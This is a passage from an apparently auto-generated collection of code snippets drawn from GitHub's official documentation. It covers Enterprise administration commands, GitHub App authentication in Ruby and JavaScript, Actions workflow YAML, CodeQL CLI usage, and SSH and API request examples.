fe:96:9e:ac:d0:22:7c:cf:22:68:f2:c3:c9:81:53:d1.\nAre you sure you want to continue connecting (yes/no)? yes\nConnect 169.254.1.1:122 OK (v2.0.0)\nStarting restore of 169.254.1.1:122 from snapshot 20141014T141425\nRestoring Git repositories ...\nRestoring GitHub Pages ...\nRestoring asset attachments ...\nRestoring hook deliveries ...\nRestoring MySQL database ...\nRestoring Redis database ...\nRestoring SSH authorized keys ...\nRestoring Elasticsearch indices ...\nRestoring SSH host keys ...\nCompleted restore of 169.254.1.1:122 from snapshot 20141014T141425\nVisit https://169.254.1.1/setup/settings to review appliance configuration.\n```\n\n----------------------------------------\n\nTITLE: Deploy to Staging Server using Hubot\nDESCRIPTION: This command is used in the `#docs-ops` Slack channel to deploy a specific branch from the `docs-internal` repository to a staging server named after the user.  The command triggers a deployment process handled by `Hubot` which provides feedback on the validity of the deployment request.  Successful deployment allows reviewing changes on a staging environment.\nSOURCE: https://github.com/github/docs/blob/main/src/deployments/staging/README.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n.deploy docs-internal/<your-branch> to staging-<your-username>\n```\n\n----------------------------------------\n\nTITLE: Octokit Usage in JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates how to use Octokit to interact with the GitHub API. It defines an asynchronous function to check and redeliver webhooks. It uses environment variables for authentication tokens, organization name, and hook ID, and instantiates Octokit with a token. The code retrieves credentials from process.env and references AUTOTITLE.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/foo/autotitling.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// This is a comment\nconst { Octokit } = require(\"octokit\");\n\n//\nasync function checkAndRedeliverWebhooks() {\n   // See [AUTOTITLE](/get-started/markdown/permissions)\n  const TOKEN = process.env.TOKEN;\n  const ORGANIZATION_NAME = process.env.ORGANIZATION_NAME;\n  const HOOK_ID = process.env.HOOK_ID;\n  const LAST_REDELIVERY_VARIABLE_NAME = process.env.LAST_REDELIVERY_VARIABLE_NAME;\n  {% ifversion ghes %}const HOSTNAME = process.env.HOSTNAME;{% endif %}\n  const WORKFLOW_REPO_NAME = process.env.WORKFLOW_REPO_NAME;\n  const WORKFLOW_REPO_OWNER = process.env.WORKFLOW_REPO_OWNER;\n\n  // Create an instance of `Octokit` using the token workflow.\n  const octokit = new Octokit({ {% ifversion ghes %}\n    baseUrl: \"{% data variables.product.rest_url %}\",{% endif %}\n    auth: TOKEN,\n  });\n```\n\n----------------------------------------\n\nTITLE: Migrate Repository with GitHub CLI\nDESCRIPTION: This command migrates a single repository from Bitbucket Server to GitHub using the `gh bbs2gh migrate-repo` command. It includes options for specifying the Bitbucket Server URL, project, repository names, GitHub organization, target API URL, SSH/SMB credentials, AWS S3 bucket name, and archive download host.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-bitbucket-server-to-github-enterprise-cloud/migrating-repositories-from-bitbucket-server-to-github-enterprise-cloud.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ngh bbs2gh migrate-repo --bbs-server-url BBS-SERVER-URL \\\n  --bbs-project PROJECT --bbs-repo CURRENT-NAME \\\n  --github-org DESTINATION --github-repo NEW-NAME \\\n  # If you are migrating to {% data variables.enterprise.data_residency_site %}:\n  --target-api-url TARGET-API-URL\n  # If your Bitbucket Server instance runs on Linux:\n  --ssh-user SSH-USER --ssh-private-key PATH-TO-KEY\n  # If your Bitbucket Server instance runs on Windows:\n  --smb-user SMB-USER\n  # If you're using AWS S3 as your blob storage provider:\n  --aws-bucket-name AWS-BUCKET-NAME\n  # If you are running a Bitbucket Data Center cluster or your Bitbucket Server is behind a load balancer:\n  --archive-download-host ARCHIVE-DOWNLOAD-HOST\n```\n\n----------------------------------------\n\nTITLE: Generating JWT with Ruby\nDESCRIPTION: This Ruby code snippet demonstrates how to generate a JWT for a GitHub App. It requires the `jwt` gem and `openssl` library. It reads the private key from a PEM file, constructs the JWT payload with the required claims (iat, exp, iss), and encodes the JWT using the RS256 algorithm.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-json-web-token-jwt-for-a-github-app.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'openssl'\nrequire 'jwt'  # https://rubygems.org/gems/jwt\n\n# Private key contents\nprivate_pem = File.read(\"YOUR_PATH_TO_PEM\")\nprivate_key = OpenSSL::PKey::RSA.new(private_pem)\n\n# Generate the JWT\npayload = {\n  # issued at time, 60 seconds in the past to allow for clock drift\n  iat: Time.now.to_i - 60,\n  # JWT expiration time (10 minute maximum)\n  exp: Time.now.to_i + (10 * 60),\n  {% ifversion client-id-for-app %}\n# {% data variables.product.prodname_github_app %}'s client ID\n  iss: \"YOUR_CLIENT_ID\"{% else %}\n# {% data variables.product.prodname_github_app %}'s app ID\n  iss: \"YOUR_APP_ID\"{% endif %}\n}\n\njwt = JWT.encode(payload, private_key, \"RS256\")\nputs jwt\n```\n\n----------------------------------------\n\nTITLE: SQL Transaction with TRY...CATCH in SQL Server\nDESCRIPTION: This SQL code snippet demonstrates how to use a transaction with error handling using SQL Server's `TRY...CATCH` construct. It attempts to delete a record from the `employees` table and insert a record into the `deletion_log` table within a transaction. If any error occurs, the transaction is rolled back, and the error is handled. The code requires SQL Server and assumes the existence of `employees` and `deletion_log` tables.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/fixing-database-deadlocks-or-data-integrity-issues.md#_snippet_7\n\nLANGUAGE: SQL\nCODE:\n```\nBEGIN TRY\n    BEGIN TRANSACTION;\n\n    DELETE FROM employees\n    WHERE employee_id = 101;\n\n    INSERT INTO deletion_log (employee_id, deletion_date, reason)\n    VALUES (101, GETDATE(), 'Voluntary Resignation');\n\n    COMMIT TRANSACTION;\nEND TRY\nBEGIN CATCH\n    ROLLBACK TRANSACTION;\n    -- Handle the error, e.g., log it or re-throw\n    DECLARE @ErrorMessage NVARCHAR(4000);\n    DECLARE @ErrorSeverity INT;\n    DECLARE @ErrorState INT;\n\n    SELECT\n        @ErrorMessage = ERROR_MESSAGE(),\n        @ErrorSeverity = ERROR_SEVERITY(),\n        @ErrorState = ERROR_STATE();\n\n    RAISERROR (@ErrorMessage, @ErrorSeverity, @ErrorState);\nEND CATCH;\n```\n\n----------------------------------------\n\nTITLE: Example Webhook Delivery\nDESCRIPTION: This example demonstrates a webhook POST request in JSON format, showcasing the headers included in the delivery and the structure of the JSON payload.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/webhook-events-and-payloads.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n> POST /payload HTTP/1.1\n\n> X-GitHub-Delivery: 72d3162e-cc78-11e3-81ab-4c9367dc0958{% ifversion ghes %}\n> X-GitHub-Enterprise-Version: 2.15.0\n> X-GitHub-Enterprise-Host: example.com{% endif %}\n> X-Hub-Signature: sha1=7d38cdd689735b008b3c702edd92eea23791c5f6\n> X-Hub-Signature-256: sha256=d57c68ca6f92289e6987922ff26938930f6e66a2d161ef06abdf1859230aa23c\n> User-Agent: GitHub-Hookshot/044aadd\n> Content-Type: application/json\n> Content-Length: 6615\n> X-GitHub-Event: issues\n> X-GitHub-Hook-ID: 292430182\n> X-GitHub-Hook-Installation-Target-ID: 79929171\n> X-GitHub-Hook-Installation-Target-Type: repository\n\n> {\n>   \"action\": \"opened\",\n>   \"issue\": {\n>     \"url\": \"{% data variables.product.rest_url %}/repos/octocat/Hello-World/issues/1347\",\n>     \"number\": 1347,\n>     ...\n>   },\n>   \"repository\" : {\n>     \"id\": 1296269,\n>     \"full_name\": \"octocat/Hello-World\",\n>     \"owner\": {\n>       \"login\": \"octocat\",\n>       \"id\": 1,\n>       ...\n>     },\n>     ...\n>   },\n>   \"sender\": {\n>     \"login\": \"octocat\",\n>     \"id\": 1,\n>     ...\n>   }\n> }\n```\n\n----------------------------------------\n\nTITLE: Adding the `whoami` function in Ruby\nDESCRIPTION: This Ruby function `whoami` retrieves the username of the authenticated user by making a GET request to the `/user` endpoint of the GitHub REST API. It reads the user access token from a `.token` file, adds it to the request headers, and parses the response to extract the username. If the token file is not found, it prompts the user to run the `login` command and exits.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\ndef whoami\n  uri = URI(\"{% data variables.product.rest_url %}/user\")\n\n  begin\n    token = File.read(\"./.token\").strip\n  rescue Errno::ENOENT => e\n    puts \"You are not authorized. Run the `login` command.\"\n    exit 1\n  end\n\n  response = Net::HTTP.start(uri.host, uri.port, use_ssl: true) do |http|\n    body = {\"access_token\" => token}.to_json\n    headers = {\"Accept\" => \"application/vnd.github+json\", \"Authorization\" => \"Bearer #{token}\"}\n\n    http.send_request(\"GET\", uri.path, body, headers)\n  end\n\n  parsed_response = parse_response(response)\n  puts \"You are #{parsed_response[\"login\"]}\"\nend\n```\n\n----------------------------------------\n\nTITLE: Applying Cluster Configuration using ghe-cluster-config-apply\nDESCRIPTION: This snippet demonstrates how to apply a new configuration to a GitHub Enterprise cluster. It uses the `ghe-cluster-config-apply` command. This command takes the current configuration and applies it to the running cluster.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_clustering/apply-configuration.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-cluster-config-apply\n```\n\n----------------------------------------\n\nTITLE: Calculating Factorial with Math Library in Python\nDESCRIPTION: This code snippet calculates the factorial of a number using the `math.factorial()` function. It first defines a variable `number` with the value 5. Then, it calculates the factorial of `number` using `math.factorial(number)` and stores the result in the `result` variable. Finally, it prints the result using an f-string.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/reusing-other-peoples-code-in-your-projects.md#_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nnumber = 5\nresult = math.factorial(number)\n\nprint(f\"The factorial of {number} is {result}\")\n```\n\n----------------------------------------\n\nTITLE: Download CodeQL Packs\nDESCRIPTION: Downloads CodeQL packs specified by name or implicitly through a query suite (.qls) file. The packs are downloaded and unzipped into the package cache by default. Requires CodeQL CLI version 2.6.0 or later.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-download.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack download [--dir=<dir>] [--force] <options>... -- <scope/name[@version]|suite.qls>...\n```\n\n----------------------------------------\n\nTITLE: Configuring Branch Ignoring in GitHub Actions Workflow (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to configure the `branches-ignore` keyword within a GitHub Actions workflow. It specifies a sequence of patterns that are matched against the Git ref's name. If a pattern matches, the workflow will not run for pull requests targeting that branch.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/triggering-workflow-branches3.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  pull_request:\n    # Sequence of patterns matched against refs/heads\n    branches-ignore:\n      - 'mona/octocat'\n      - 'releases/**-alpha'\n```\n\n----------------------------------------\n\nTITLE: Resolve Files Command\nDESCRIPTION: This command expands a set of file inclusion/exclusion globs to identify files within a specified directory for further processing. It's a plumbing command used internally by other CodeQL CLI subcommands. It takes a directory as input and uses include/exclude globs to filter files.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-files.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql resolve files <options>... -- <dir>\n```\n\n----------------------------------------\n\nTITLE: Changing Directory in Shell\nDESCRIPTION: This command changes the current directory to the 'hello-world-javascript-action' directory, where the action's code and configuration files reside. It's a standard shell command used to navigate the file system.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-javascript-action.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncd hello-world-javascript-action\n```\n\n----------------------------------------\n\nTITLE: Inspecting Specific Allocations with ghe-cluster-balance status\nDESCRIPTION: This snippet shows how to inspect allocations for specific jobs by providing a single job or a comma-delimited list of jobs to the `ghe-cluster-balance status` utility using the `-j` flag. This allows you to focus on the status of specific allocations.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/rebalancing-cluster-workloads.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-balance status -j JOB\n```\n\n----------------------------------------\n\nTITLE: Checking Out Local Branch\nDESCRIPTION: This snippet shows how to checkout the fork's local default branch (in this case, `main`). It uses the `git checkout` command to switch to the specified branch.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/syncing-a-fork.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ git checkout main\n> Switched to branch 'main'\n```\n\n----------------------------------------\n\nTITLE: Setting Failure Exit Code - JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates how to use the `@actions/core` package to log an error message and set a failure exit code in a JavaScript action.  It utilizes a `try...catch` block to handle potential errors and then sets the action as failed using `core.setFailed(error.message)`. This will result in a non-zero exit code.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ntry {\n  // something\n} catch (error) {\n  core.setFailed(error.message);\n}\n```\n\n----------------------------------------\n\nTITLE: Conditional Workflow Execution based on Operating System (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to use the `runner.os` context property to conditionally execute steps in a GitHub Actions workflow based on the operating system of the runner. It defines a workflow with a single job that contains two steps, each of which uses an `if` condition to check the value of `runner.os`. One step executes if the runner's OS is Windows, and the other if it isn't.  The environment variable `$RUNNER_OS` is used to display the OS name within each step.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\non: workflow_dispatch\n\njobs:\n  if-Windows-else:\n    runs-on: macos-latest\n    steps:\n      - name: condition 1\n        if: runner.os == 'Windows'\n        run: echo \"The operating system on the runner is $env:RUNNER_OS.\"\n      - name: condition 2\n        if: runner.os != 'Windows'\n        run: echo \"The operating system on the runner is not Windows, it's $RUNNER_OS.\"\n```\n\n----------------------------------------\n\nTITLE: Viewing Details for a Specific Workflow Run using GitHub CLI\nDESCRIPTION: This snippet shows how to view details for a specific workflow run using the `gh run view` command. Replace `RUN_ID` with the ID of the workflow run. If no `RUN_ID` is provided, an interactive menu is displayed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngh run view RUN_ID\n```\n\n----------------------------------------\n\nTITLE: Handling 'requested_action' Event\nDESCRIPTION: This Ruby code snippet is added to the `server.rb` file to handle the `requested_action` event for check runs. When a user clicks the 'Fix this' button, the `take_requested_action` method is called.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nwhen 'requested_action'\n  take_requested_action\n```\n\n----------------------------------------\n\nTITLE: Configuring Redirects with redirect_from in YAML\nDESCRIPTION: This YAML snippet illustrates the usage of the `redirect_from` property to define URLs that should redirect to a specific documentation page.  It's an array of URLs, and is essential for maintaining link integrity when content is moved or reorganized. This allows users to find the correct page even if they use an old URL.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-yaml-frontmatter.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ntitle: Getting started with GitHub Desktop\nredirect_from:\n  - /articles/first-launch\n  - /articles/error-github-enterprise-version-is-too-old\n  - /articles/getting-started-with-github-for-windows\n```\n\n----------------------------------------\n\nTITLE: Initializing Git Repository\nDESCRIPTION: This command initializes a new Git repository in the current directory. It is useful when starting a new project from a blank template in GitHub Codespaces. It enables source control features within the codespace.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/about-codespaces/deep-dive.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngit init\n```\n\n----------------------------------------\n\nTITLE: Conditional Job Execution based on Repository - YAML\nDESCRIPTION: This YAML snippet demonstrates how to use the `if` conditional to control when a job runs. The `production-deploy` job only runs if the repository is named `octo-org/octo-repo-prod`. It uses standard GitHub Actions steps for checkout, node setup, and running npm.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-using-conditions-to-control-job-execution.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: example-workflow\non: [push]\njobs:\n  production-deploy:\n    if: github.repository == 'octo-org/octo-repo-prod'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n```\n\n----------------------------------------\n\nTITLE: Complete app_cli.rb Example\nDESCRIPTION: This is the complete example of the `app_cli.rb` file with the `login` command integrated, which consolidates all of the functionality implemented. It covers all the requirements from initializing the constants to implementing functions for API requests, parsing responses, and handling user interaction.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\n#!/usr/bin/env ruby\n\nrequire \"net/http\"\nrequire \"json\"\nrequire \"uri\"\nrequire \"fileutils\"\n\nCLIENT_ID=\"YOUR_CLIENT_ID\"\n\ndef help\n  puts \"usage: app_cli <login | help>\"\nend\n\ndef main\n  case ARGV[0]\n  when \"help\"\n    help\n  when \"login\"\n    login\n  when \"whoami\"\n    puts \"`whoami` is not yet defined\"\n  else\n    puts \"Unknown command #{ARGV[0]}\"\n  end\nend\n\ndef parse_response(response)\n  case response\n  when Net::HTTPOK, Net::HTTPCreated\n    JSON.parse(response.body)\n  else\n    puts response\n    puts response.body\n    exit 1\n  end\nend\n\ndef request_device_code\n  uri = URI(\"{% data variables.product.oauth_host_code %}/login/device/code\")\n  parameters = URI.encode_www_form(\"client_id\" => CLIENT_ID)\n  headers = {\"Accept\" => \"application/json\"}\n\n  response = Net::HTTP.post(uri, parameters, headers)\n  parse_response(response)\nend\n\ndef request_token(device_code)\n  uri = URI(\"{% data variables.product.oauth_host_code %}/login/oauth/access_token\")\n  parameters = URI.encode_www_form({\n    \"client_id\" => CLIENT_ID,\n    \"device_code\" => device_code,\n    \"grant_type\" => \"urn:ietf:params:oauth:grant-type:device_code\"\n  })\n  headers = {\"Accept\" => \"application/json\"}\n  response = Net::HTTP.post(uri, parameters, headers)\n  parse_response(response)\nend\n\ndef poll_for_token(device_code, interval)\n\n  loop do\n    response = request_token(device_code)\n    error, access_token = response.values_at(\"error\", \"access_token\")\n\n    if error\n      case error\n      when \"authorization_pending\"\n        # The user has not yet entered the code.\n        # Wait, then poll again.\n        sleep interval\n        next\n      when \"slow_down\"\n        # The app polled too fast.\n        # Wait for the interval plus 5 seconds, then poll again.\n        sleep interval + 5\n        next\n      when \"expired_token\"\n        # The `device_code` expired, and the process needs to restart.\n        puts \"The device code has expired. Please run `login` again.\"\n        exit 1\n      when \"access_denied\"\n        # The user cancelled the process. Stop polling.\n        puts \"Login cancelled by user.\"\n        exit 1\n      else\n        puts response\n        exit 1\n      end\n    end\n\n    File.write(\"./.token\", access_token)\n\n    # Set the file permissions so that only the file owner can read or modify the file\n    FileUtils.chmod(0600, \"./.token\")\n\n    break\n  end\nend\n\ndef login\n  verification_uri, user_code, device_code, interval = request_device_code.values_at(\"verification_uri\", \"user_code\", \"device_code\", \"interval\")\n\n  puts \"Please visit: #{verification_uri}\"\n  puts \"and enter code: #{user_code}\"\n\n  poll_for_token(device_code, interval)\n\n  puts \"Successfully authenticated!\"\nend\n\nmain\n```\n\n----------------------------------------\n\nTITLE: Changing Branch Name Separator in Dependabot YAML\nDESCRIPTION: This YAML snippet demonstrates how to change the default separator in the Dependabot pull request branch name for npm dependencies from '/' to '-'.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/customizing-dependabot-prs.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n# Specify a different separator for branch names\n\nversion: 2\nupdates:\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    pull-request-branch-name:\n      # Change the default separator (/) to a hyphen (-)\n      separator: \"-\"\n```\n\n----------------------------------------\n\nTITLE: Configuring SSH Connection with Private Key\nDESCRIPTION: This configuration block specifies settings for connecting to the administrative shell via SSH within the `~/.ssh/config` file. It defines the `IdentityFile` (path to the private key), `User` (admin), and `Port` (122) for the specified `HOSTNAME`. This allows for simplified SSH connections without needing to specify the key and port each time. `HOSTNAME` needs to be replaced with the actual address.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/accessing-the-administrative-shell-ssh.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nHost HOSTNAME\n  IdentityFile /path/to/ghe_private_key\n  User admin\n  Port 122\n```\n\n----------------------------------------\n\nTITLE: Starting fish_config\nDESCRIPTION: This shell script launches the `fish_config` web interface for configuring the fish shell.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-shell-in-a-codespace.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n$ fish_config\nWeb config started at file:///tmp/web_config60rc9tr3.html\nHit ENTER to stop.\n```\n\n----------------------------------------\n\nTITLE: Auditing Bitbucket Pipelines\nDESCRIPTION: This bash script command audits a Bitbucket workspace to identify pipelines that can be migrated to GitHub Actions, and generates a report summarizing the migration feasibility.  It requires the `gh actions-importer` CLI to be configured. The `--workspace` flag specifies the Bitbucket workspace name, and `--output-dir` defines the directory for the audit results.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer audit bitbucket --workspace :workspace --output-dir tmp/audit\n```\n\n----------------------------------------\n\nTITLE: Executing CodeQL Queries\nDESCRIPTION: This shell command executes one or more CodeQL queries against a specified dataset. It requires the path to the dataset and a list of queries, directories, query suites, or CodeQL packs. It provides options to specify the output directory or file, the number of threads to use, and various evaluator options.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/execute-queries.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql execute queries [--output=<dir|file.bqrs>] [--threads=<num>] <options>... -- <dataset> <query|dir|suite|pack>...\n```\n\n----------------------------------------\n\nTITLE: Workflow Status Badge with Branch Parameter\nDESCRIPTION: This example demonstrates how to include a branch parameter in the workflow status badge URL to show the status of a specific branch (e.g., `feature-1`).  The example uses Markdown to embed the image.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/adding-a-workflow-status-badge.md#_snippet_2\n\nLANGUAGE: Markdown\nCODE:\n```\n![example branch parameter](https://github.com/github/docs/actions/workflows/main.yml/badge.svg?branch=feature-1)\n```\n\n----------------------------------------\n\nTITLE: SSH Key Audit Error Message\nDESCRIPTION: This code snippet shows the error message displayed when using an unverified SSH key for Git operations. It provides the reason for the audit, a link to the SSH settings page, and the fingerprint of the key.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-were-doing-an-ssh-key-audit.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nERROR: We're doing an SSH key audit.\nReason: unverified due to lack of use\nPlease visit https://github.com/settings/ssh\nto approve this key so we know it's safe.\nFingerprint: ab:08:46:83:ff:f6:c4:f8:a9:4e:68:6b:94:17:f2:46\nfatal: could not read from remote repository\n```\n\n----------------------------------------\n\nTITLE: Introspection Query via GET Request\nDESCRIPTION: This shell command performs an introspection query on the GraphQL schema using a GET request. It requires an authorization token. The output is in JSON format and can be processed using tools like jq or python -m json.tool for better readability.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/introduction-to-graphql.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ncurl -H \"Authorization: bearer TOKEN\" {% data variables.product.graphql_url %}\n```\n\n----------------------------------------\n\nTITLE: Generating a new SSH key for a hardware security key (ECDSA Fallback) - Shell\nDESCRIPTION: This command generates a new SSH key specifically for a hardware security key using the ecdsa-sk algorithm and associates it with the provided email address. This is used as a fallback if the hardware security key does not support the ed25519 algorithm.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\nssh-keygen -t ecdsa-sk -C \"your_email@example.com\"\n```\n\n----------------------------------------\n\nTITLE: Accept Test Results Using CodeQL CLI\nDESCRIPTION: This command renames the `.actual` files to `.expected` files for failing tests, updating the expected results. It's a convenience wrapper around file manipulation for accepting test outputs after running `codeql test run`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/test-accept.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql test accept <options>... -- <test|dir>...\n```\n\n----------------------------------------\n\nTITLE: CORS Request Example (Initial)\nDESCRIPTION: This curl command demonstrates a basic CORS request to the GitHub REST API endpoint. The `Origin` header simulates a request from a different domain. The response includes `Access-Control-Allow-Origin: *` indicating that cross-origin requests are permitted.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/using-cors-and-jsonp-to-make-cross-origin-requests.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ curl -I {% data variables.product.rest_url %} -H \"Origin: http://example.com\"\nHTTP/2 302\nAccess-Control-Allow-Origin: *\nAccess-Control-Expose-Headers: ETag, Link, x-ratelimit-limit, x-ratelimit-remaining, x-ratelimit-reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval\n```\n\n----------------------------------------\n\nTITLE: Configuring SSH for Keychain integration - Text\nDESCRIPTION: This configuration block is added to the `~/.ssh/config` file to automatically add SSH keys to the ssh-agent and store passphrases in the keychain on macOS. It requires the `AddKeysToAgent` and `UseKeychain` directives. `IdentityFile` specifies the SSH private key file to use.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_4\n\nLANGUAGE: Text\nCODE:\n```\nHost {% ifversion ghes %}HOSTNAME{% else %}github.com{% endif %}\n  AddKeysToAgent yes\n  UseKeychain yes\n  IdentityFile ~/.ssh/id_ed25519\n```\n\n----------------------------------------\n\nTITLE: Listing Codespaces with GitHub CLI\nDESCRIPTION: This command lists all the codespaces associated with the current user using the GitHub CLI. It provides information such as the name and current machine type of each codespace. The output is displayed in the terminal.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-machine-type-for-your-codespace.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace list\n```\n\n----------------------------------------\n\nTITLE: Resolving Extensions by Pack using CodeQL CLI\nDESCRIPTION: This command resolves the set of data extensions and GitHub-created machine learning models available to specified pack roots. It requires the CodeQL CLI and pack paths as input. The output is a set of resolved extensions.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-extensions-by-pack.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql resolve extensions-by-pack <options>... -- <pack>...\n```\n\n----------------------------------------\n\nTITLE: Pushing the Mercurial imported repository (Shell)\nDESCRIPTION: This command pushes the imported Mercurial repository to GitHub Enterprise Server. It uses the `--mirror` option to ensure all refs are pushed. Replace `PUSH-URL-ON-GITHUB-ENTERPRISE` with the actual push URL on GitHub Enterprise.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-from-other-version-control-systems-with-the-administrative-shell.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngit push --mirror PUSH-URL-ON-GITHUB-ENTERPRISE\n```\n\n----------------------------------------\n\nTITLE: Adding Comment to Issue with GraphQL (Incorrect Type)\nDESCRIPTION: This GraphQL mutation attempts to add a comment to an issue but uses an integer value for the `clientMutationId` field, which expects a string. This example demonstrates the strong typing of GraphQL schemas, which will result in an error.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-from-rest-to-graphql.md#_snippet_7\n\nLANGUAGE: graphql\nCODE:\n```\nmutation {\n  addComment(input:{clientMutationId: 1234, subjectId: \"MDA6SXNzdWUyMjcyMDA2MTT=\", body: \"Looks good to me!\"}) {\n    clientMutationId\n    commentEdge {\n      node {\n        body\n        repository {\n          id\n          name\n          nameWithOwner\n        }\n        issue {\n          number\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for Java Project with Maven\nDESCRIPTION: This snippet creates a CodeQL database for a Java/Kotlin project built with Maven.  It uses `mvn clean install` to build the project. It assumes Maven and CodeQL CLI are installed and accessible.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create java-database --language=java-kotlin --command='mvn clean install'\n```\n\n----------------------------------------\n\nTITLE: Connecting a package to a repository in gem metadata\nDESCRIPTION: This Ruby snippet shows how to 